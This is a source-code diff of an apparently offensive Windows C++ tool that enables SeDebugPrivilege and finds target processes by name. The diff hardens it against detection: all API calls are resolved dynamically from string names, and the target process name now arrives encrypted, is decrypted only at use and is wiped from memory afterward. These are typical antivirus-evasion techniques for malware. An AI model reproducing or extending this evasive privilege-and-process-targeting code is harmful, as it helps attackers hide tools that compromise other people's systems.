@@ -21,7 +21,7 @@ bool SetPrivilege(
 	{
 #ifdef _DEBUG
 		std::cerr << "LookupPrivilegeValue error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
-#endif // _DEBUG
+#endif 
 		return false;
 	}
 
@@ -40,7 +40,7 @@ bool SetPrivilege(
 	{
 #ifdef _DEBUG
 		std::cerr << "AdjustTokenPrivileges error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
-#endif // _DEBUG
+#endif 
 		return false;
 	}
 
@@ -48,7 +48,7 @@ bool SetPrivilege(
 	if (resolve_dynamically<GetLastError_t>(str_GetLastError)() == ERROR_NOT_ALL_ASSIGNED) {
 #ifdef _DEBUG
 		std::cerr << "The token does not have the specified privilege." << std::endl;
-#endif // _DEBUG
+#endif 
 		return false;
 	}
 
@@ -68,7 +68,7 @@ int EscalatePrivilege()
 	{
 #ifdef _DEBUG
 		std::cerr << "OpenProcessToken error: " << resolve_dynamically<GetLastError_t>(str_GetLastError)() << std::endl;
-#endif // _DEBUG
+#endif 
 		return -1;
 	}
 
@@ -77,7 +77,7 @@ int EscalatePrivilege()
 		{
 #ifdef _DEBUG
 			std::cerr << "Failed to enable SeDebugPrivilege." << std::endl;
-#endif // _DEBUG
+#endif 
 			return -1;
 		}
 
@@ -87,7 +87,7 @@ int EscalatePrivilege()
 }
 
 
-DWORD GetProcessIdByName(const char* procName)
+DWORD GetProcessIdByName(EncryptedString &procName)
 {
 	typedef decltype(CreateToolhelp32Snapshot)* CreateToolhelp32Snapshot_t;
 	typedef decltype(Process32First)* Process32First_t;
@@ -95,19 +95,22 @@ DWORD GetProcessIdByName(const char* procName)
 
 	PROCESSENTRY32 entry;
 	entry.dwSize = sizeof(PROCESSENTRY32);
-
+	
 	HANDLE snapshot = resolve_dynamically<CreateToolhelp32Snapshot_t>(str_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
 
 	if (resolve_dynamically<Process32First_t>(str_Process32First)(snapshot, &entry) == TRUE)
 	{
+		std::string procNameDecrypted = string_decrypt(procName);
 		while (resolve_dynamically<Process32Next_t>(str_Process32Next)(snapshot, &entry) == TRUE)
 		{
-			if (_stricmp(entry.szExeFile, procName) == 0)
+			if (_stricmp(entry.szExeFile, procNameDecrypted.c_str()) == 0)
 			{
+				wipeStr(procNameDecrypted);
 				resolve_dynamically<CloseHandle_t>(str_CloseHandle)(snapshot);
 				return entry.th32ProcessID;
 			}
 		}
+		wipeStr(procNameDecrypted);
 	}
 
 	return 0;
